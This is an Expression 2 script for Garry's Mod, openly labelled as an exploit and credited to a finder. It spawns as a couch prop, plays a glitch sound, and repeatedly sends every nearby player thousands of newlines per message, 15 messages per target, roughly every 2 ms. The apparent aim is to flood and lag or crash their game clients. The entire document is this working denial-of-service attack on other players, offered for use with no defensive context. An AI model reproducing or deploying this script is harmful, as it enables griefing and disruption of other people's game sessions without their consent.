@name exploits/funny_couch
@persist Couch:entity TARGETS:array SPAM:string
@model models/props_c17/FurnitureCouch002a.mdl

# NON-VANILLA: requires plycore

# found by Spanky
# spawn away from self

if( first() ){
    timer("tick",1000)
    timer("glitch",100)
    SPAM = "\n":repeat(25000)
    Couch = entity()
    Couch:soundPlay("glitch",0,"synth/saw_inverted_1760.wav")
}

if(clk("glitch")){
    soundPitch("glitch",random()*200)
    timer("glitch",randint(250,1500))
}


if(clk("tick")){
    
    findIncludeEntities(players())
    findInSphere(Couch:pos(),256)
    TARGETS = findToArray()
    
    foreach(K,V:entity = TARGETS)
    {
        for(I=1,15)
        {
            V:sendMessageColor(SPAM)
        }
    }
    
    timer("tick",2)
}
